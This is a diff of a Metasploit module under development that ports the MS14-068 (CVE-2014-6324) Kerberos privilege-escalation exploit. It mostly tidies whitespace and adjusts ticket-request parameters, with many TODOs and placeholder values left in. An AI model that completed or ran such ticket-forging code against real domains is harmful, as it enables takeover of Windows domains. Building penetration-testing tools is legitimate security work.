@@ -19,8 +19,8 @@ class MetasploitModule < Msf::Auxiliary
         },
         'Author' => [
           'Alberto Solino', # impacket example
-          'Jacob Robles',    # Python Metasploit module conversion
-          'alanfoster'      # Ruby Metasploit module conversion
+          'Jacob Robles',   # Python Metasploit module conversion
+          'alanfoster'      # Ruby Metasploit module
         ],
         'References' => [
           ['CVE', '2014-6324'],
@@ -45,6 +45,7 @@ class MetasploitModule < Msf::Auxiliary
       ]
     )
   end
+
 
   # Sends the required kerberos AS requests for a kerberos Ticket Granting Ticket
   #
@@ -146,7 +147,6 @@ class MetasploitModule < Msf::Auxiliary
       raise "todo"
     end
 
-
     {
       ticket: as_rep_result.ticket,
       auth: extract_enc_kdc_response(as_rep_result, password_digest),
@@ -176,7 +176,6 @@ class MetasploitModule < Msf::Auxiliary
     # TODO: Tomorrow's problems:
     #   - Find out what enc_part is for, do we need to pass it as part of the tgs?
 
-
     now = Time.now.utc
     expiry_time = now + 1.day
 
@@ -194,20 +193,23 @@ class MetasploitModule < Msf::Auxiliary
     #
     # auth_data = build_pac_authorization_data(pac: pac)
 
-
     tgs_res = send_request_tgs(
       # TODO: client_name isn't required as part of the tgs body, it's part of the authenticator data though. TODO: Find the difference between cname and client_name
       client_name: client_name,
-      cname: client_name,
+      # cname: client_name,
       # TODO:
       server_name: 'adf3.local\fake_mysql',  # "krbtgt/#{domain}",
       realm: domain,
       ticket: tgt_result[:ticket],
 
+      # Options: Forwardable | Renewable | Canonicalize | Renewable-ok
+      options: 0x40810010,
+
       # TODO: Find the difference between session_key and subkey
       # From: lib/msf/core/exploit/remote/kerberos/client/tgs_request.rb:134 Msf::Exploit::Remote::Kerberos::Client::TgsRequest#build_ap_req:
-      # session_key: tgt_result[:auth].key,
-      subkey: tgt_result[:auth].key,
+      session_key: tgt_result[:auth].key,
+      subkey: nil,
+      checksum: nil,
 
       # Specify nil to ensure the KDC uses the current time for the desired starttime of the requested ticket
       from: nil,
@@ -227,8 +229,6 @@ class MetasploitModule < Msf::Auxiliary
       # ],
       # subkey: sub_key
     )
-
-
 
     return
 
